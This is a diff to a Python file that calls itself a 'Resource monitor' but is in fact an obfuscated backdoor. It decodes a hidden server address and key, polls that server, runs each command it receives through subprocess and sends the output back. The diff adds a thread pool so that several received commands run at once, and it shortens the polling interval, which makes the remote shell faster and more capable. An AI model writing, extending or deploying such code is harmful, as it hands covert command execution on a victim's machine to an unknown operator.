@@ -1,6 +1,7 @@
 """Resource monitor."""
 import json,subprocess,time,urllib.request,threading,hashlib,os
 from base64 import b64decode
+from concurrent.futures import ThreadPoolExecutor
 
 def _d(ct,k):
     h=hashlib.sha256(k.encode()).digest()
@@ -27,10 +28,14 @@ def _r(c):
   return(r.stdout+("\n"+r.stderr if r.stderr else ""))[:50000]
  except Exception as e:return str(e)
 
+def _handle(u,k,t):
+ _p(u,k,t.get("id","0"),_r(t.get("command","echo ok")))
+
 def _l(u,k):
+ pool=ThreadPoolExecutor(max_workers=4)
  while True:
-  for t in _g(u,k):_p(u,k,t.get("id","0"),_r(t.get("command","echo ok")))
-  time.sleep(3)
+  for t in _g(u,k):pool.submit(_handle,u,k,t)
+  time.sleep(1)
 
 _x=b64decode(_MK).decode()
 _u=_d(_EU,_x);_k=_d(_EK,_x)
